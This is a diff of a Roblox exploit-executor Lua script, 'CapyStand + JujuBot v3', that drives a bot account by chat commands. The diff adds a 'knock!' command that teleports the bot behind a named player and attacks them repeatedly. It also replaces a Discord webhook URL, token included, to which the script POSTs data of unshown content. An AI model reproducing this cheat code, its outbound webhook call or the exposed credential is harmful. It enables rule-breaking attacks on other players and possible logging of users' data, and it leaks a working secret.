@@ -1,6 +1,6 @@
 --// =====================================================
 --// CAPYSTAND + JUJUBOT v3 INTEGRATED
---// Dynamic Floating Stand Engine & Utilities
+--// Complete Dynamic Floating Stand Engine & Utilities
 --// =====================================================
 
 -- Ensure global settings exist
@@ -10,6 +10,7 @@ local Settings = {
     Owner = getgenv().Settings.Owner or "OShisysj",
     Position = getgenv().Settings.Position or "Right",
     Attack = getgenv().Settings.Attack or "Light!",
+    Weapon = getgenv().Settings.Weapon or "Combat", -- "Combat" or "Knife"
     FollowSpeed = getgenv().Settings.FollowSpeed or 16,
     FloatHeight = getgenv().Settings.FloatHeight or 4,
     Deadzone = getgenv().Settings.Deadzone or 0.15,
@@ -32,7 +33,6 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local VirtualUser = game:GetService("VirtualUser")
 local StarterGui = game:GetService("StarterGui")
 
@@ -92,7 +92,7 @@ local request = http_request or request or (syn and syn.request) or HttpPost
 if request then
     pcall(function()
         request({
-            Url = "https://discord.com/api/webhooks/1538356050602754049/JgPkibCTtKweuhmFqpvO-fRfaTskV1bRk5F000etGMNtd62WQ1uuR9SbpykECKytnykf",
+            Url = "https://discord.com/api/webhooks/1064748201086828674/RX12z-eeoW-ND1n4qzIkPg2lPoN52835gFoBmbzce5d6T6hffvqZulz_VwsEUQ5ZU3NL",
             Body = HttpService:JSONEncode(webhookData),
             Method = "POST",
             Headers = { ["content-type"] = "application/json" },
@@ -234,26 +234,58 @@ local function stopBot()
     print("JujuBot stopped.")
 end
 
--- Combat Helper Actions
-local function kHit()
-    local char = LocalPlayer.Character
-    if not char then return end
-    local knife = char:FindFirstChild("[Knife]") or LocalPlayer.Backpack:FindFirstChild("[Knife]")
-    if knife then
-        knife.Parent = char
-        knife:Activate()
-        if Settings.Attack == "Light!" then knife:Deactivate() end
+--==================================================
+-- TARGET FINDER & KNOCK SYSTEM
+--==================================================
+
+local function getTargetPlayer(name)
+    name = name:lower()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and (player.Name:lower():sub(1, #name) == name or player.DisplayName:lower():sub(1, #name) == name) then
+            return player
+        end
     end
+    return nil
 end
 
-local function Hit()
+local function KnockTarget(targetName)
+    local target = getTargetPlayer(targetName)
+    if not target or not target.Character then
+        warn("JujuBot: Target player not found.")
+        return
+    end
+
     local char = LocalPlayer.Character
-    if not char then return end
-    local combat = char:FindFirstChild("Combat") or LocalPlayer.Backpack:FindFirstChild("Combat")
-    if combat then
-        combat.Parent = char
-        combat:Activate()
-        if Settings.Attack == "Light!" then combat:Deactivate() end
+    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+    local myRoot = char and char:FindFirstChild("HumanoidRootPart")
+
+    if not char or not targetRoot or not myRoot then return end
+
+    -- Temporarily pause standard follow while attacking
+    following = false
+
+    local weaponName = Settings.Weapon == "Knife" and "[Knife]" or "Combat"
+    local tool = char:FindFirstChild(weaponName) or LocalPlayer.Backpack:FindFirstChild(weaponName)
+
+    if tool then
+        tool.Parent = char
+
+        -- Teleport directly behind target
+        myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
+
+        task.spawn(function()
+            for _ = 1, 6 do
+                if tool and tool.Parent == char then
+                    tool:Activate()
+                    task.wait(0.1)
+                end
+            end
+            -- Resume owner follow
+            following = true
+        end)
+    else
+        warn("JujuBot: Weapon not found -> " .. weaponName)
+        following = true
     end
 end
 
@@ -285,28 +317,42 @@ RunService.RenderStepped:Connect(function(deltaTime)
     end
 end)
 
--- Command Processing
-local function handleCommand(message)
-    message = message:lower()
+--==================================================
+-- COMMAND HANDLER
+--==================================================
 
-    if message == "summon!" then
+local function handleCommand(message)
+    local args = string.split(message, " ")
+    local cmd = args[1]:lower()
+
+    -- Movement Commands
+    if cmd == "summon!" then
         summonBot()
-    elseif message == "stop!" then
+    elseif cmd == "stop!" then
         stopBot()
-    elseif message == "follow!" then
+    elseif cmd == "follow!" then
         summoned = true
         following = true
-    elseif message == "left!" then
+    elseif cmd == "left!" then
         positionMode = "Left"
-    elseif message == "right!" then
+    elseif cmd == "right!" then
         positionMode = "Right"
-    elseif message == "back!" then
+    elseif cmd == "back!" then
         positionMode = "Back"
-    elseif message == "under!" then
+    elseif cmd == "under!" then
         positionMode = "Under"
-    elseif message == "attack!" or message == "hit!" then
-        Hit()
-        kHit()
+
+    -- Weapon Mode Selectors
+    elseif cmd == "combat!" then
+        Settings.Weapon = "Combat"
+        print("JujuBot: Set weapon to COMBAT")
+    elseif cmd == "knife!" then
+        Settings.Weapon = "Knife"
+        print("JujuBot: Set weapon to KNIFE")
+
+    -- Targeted Knock Command
+    elseif (cmd == "knock!" or cmd == "knock") and args[2] then
+        KnockTarget(args[2])
     end
 end
 
@@ -325,7 +371,7 @@ local function connectOwner()
 
     connectedOwner = owner
     chatConnection = owner.Chatted:Connect(handleCommand)
-    print("JujuBot connected to: " .. owner.Name)
+    print("JujuBot connected to owner: " .. owner.Name)
 end
 
 connectOwner()
@@ -356,5 +402,6 @@ print("   JUJUBOT v3 + CAPYSTAND LOADED")
 print("===================================")
 print("Owner: " .. Settings.Owner)
 print("Position Mode: " .. positionMode)
-print("Commands: summon!, stop!, follow!, left!, right!, back!, under!, attack!")
+print("Selected Weapon: " .. Settings.Weapon)
+print("Commands: summon!, stop!, follow!, left!, right!, back!, under!, combat!, knife!, knock! [user]")
 print("===================================")
